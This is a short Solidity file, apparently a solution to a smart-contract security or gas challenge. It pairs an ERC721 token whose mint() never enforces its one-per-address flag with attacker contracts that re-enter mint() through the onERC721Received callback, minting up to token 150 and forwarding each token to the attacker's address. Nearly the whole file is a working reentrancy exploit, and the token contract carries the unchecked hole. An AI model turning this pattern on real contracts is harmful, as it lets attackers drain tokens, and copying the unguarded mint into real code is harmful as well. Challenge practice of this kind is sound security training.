//SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

import "@openzeppelin/contracts/token/ERC721/ERC721.sol";

// You may not modify this contract or the openzeppelin contracts
contract NotRareToken is ERC721 {
    mapping(address => bool) private alreadyMinted;

    uint256 private totalSupply;

    constructor() ERC721("NotRareToken", "NRT") {}

    function mint() external {
        totalSupply++;
        _safeMint(msg.sender, totalSupply);
        alreadyMinted[msg.sender] = true;
    }
}

contract OptimizedAttacker {
    
    constructor(address victim) {
        DummyAttacker dummyAttacker = new DummyAttacker(victim, msg.sender);
        dummyAttacker.attack();
    }
}

contract DummyAttacker {
    address immutable victimConctract;
    address immutable attacker;

    constructor(address victim, address attackerAddress) {
        victimConctract = victim;
        attacker = attackerAddress;
    }

    function attack() external {
        NotRareToken(victimConctract).mint();
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4) {
        if (tokenId < 150){
            NotRareToken(victimConctract).mint();
        }
        NotRareToken(victimConctract).transferFrom(address(this), attacker, tokenId);
        return this.onERC721Received.selector;
    }
}
